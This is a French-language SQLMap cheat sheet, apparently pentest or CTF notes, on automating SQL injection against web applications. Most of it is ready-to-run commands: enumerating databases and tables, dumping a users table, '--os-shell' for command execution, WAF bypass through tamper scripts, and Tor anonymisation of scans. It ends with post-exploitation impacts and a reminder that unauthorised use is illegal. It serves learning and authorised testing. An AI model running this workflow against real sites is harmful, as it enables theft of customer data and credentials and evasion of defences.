# 🛡️SQLMap

SQLMap est l'outil de référence pour l'automatisation de la détection et de l'exploitation des failles d'injection SQL. Ce guide condense les techniques essentielles pour passer de la simple vérification à l'extraction complète de données.

---

## 1. Fondamentaux de la Cible

### Injection GET (URL directe)
```bash
sqlmap -u "http://target.com/page.php?id=1"
```

### Injection POST (Requête interceptée)
La méthode la plus robuste consiste à copier une requête HTTP (via Burp Suite ou ZAP) dans un fichier `request.txt`. Marquez le paramètre vulnérable avec un astérisque `*` si nécessaire.
```bash
sqlmap -r request.txt --batch
```

---

## 2. Augmenter la Puissance de Détection

Par défaut, SQLMap est discret. Pour les injections complexes (Headers, Cookies, JSON), augmentez l'agressivité :

*   **`--level=5`** : Teste un nombre massif de payloads et de points d'insertion (y compris les Headers HTTP).
*   **`--risk=3`** : Autorise des tests plus lourds pouvant potentiellement altérer la base de données.
*   **`--threads=10`** : Accélère l'extraction des données.

```bash
sqlmap -u URL --level=5 --risk=3 --batch --threads=10
```

---

## 3. Workflow d'Énumération (L'Ordre Logique)

Le succès d'une attaque SQLi repose sur une exploration structurée :

1.  **Identifier les Bases de Données :**
    ```bash
    sqlmap -u URL --dbs
    ```
2.  **Lister les Tables d'une base spécifique (`-D`) :**
    ```bash
    sqlmap -u URL -D target_db --tables
    ```
3.  **Lister les Colonnes d'une table (`-T`) :**
    ```bash
    sqlmap -u URL -D target_db -T users --columns
    ```
4.  **Extraire les Données (Dump) :**
    ```bash
    sqlmap -u URL -D target_db -T users --dump
    ```

---

## 4. Commandes de "Power User"

| Objectif | Commande |
| :--- | :--- |
| **Mode Automatique** | `--batch` (Répond oui à tout) |
| **Optimisation SGBD** | `--dbms=MySQL` (Évite les tests inutiles) |
| **Vérifier Privilèges** | `--is-dba` (Suis-je admin de la DB ?) |
| **Shell Système** | `--os-shell` (Tenter une exécution de commande) |
| **Extraction Rapide** | `--dump-all` (Récupère tout, attention au volume) |
| **Passer un Proxy** | `--proxy=http://127.0.0.1:8080` (Passer par Burp) |
| **Tor Network** | `--tor` (Anonymiser le scan) |

---

## 5. Cas Pratiques & CTF

**Scénario : Extraction rapide d'un flag ou d'identifiants**
```bash
sqlmap -u "http://sqlmaptesting.thm/search/cat=1" --dbms=MySQL --batch --dump -T users
```

**Scénario : Bypass de WAF / Filtres basiques**
Utilisez des scripts de "tamper" pour encoder les payloads :
```bash
sqlmap -u URL --tamper=space2comment,between,charencode
```

---

## 6. Impacts et Post-Exploitation
Une injection SQL réussie permet :
*   **Exfiltration :** Vol de bases clients, hashs de mots de passe.
*   **Prise de contrôle :** Si l'utilisateur DB est `FILE_PRIV`, lecture/écriture de fichiers sur le serveur.
*   **Escalade :** Utilisation des hashs pour du cracking hors-ligne ou du credential stuffing.

> **Rappel Sécurité :** L'utilisation de SQLMap sans autorisation explicite est illégale. Testez uniquement sur vos environnements ou des plateformes de bug bounty.
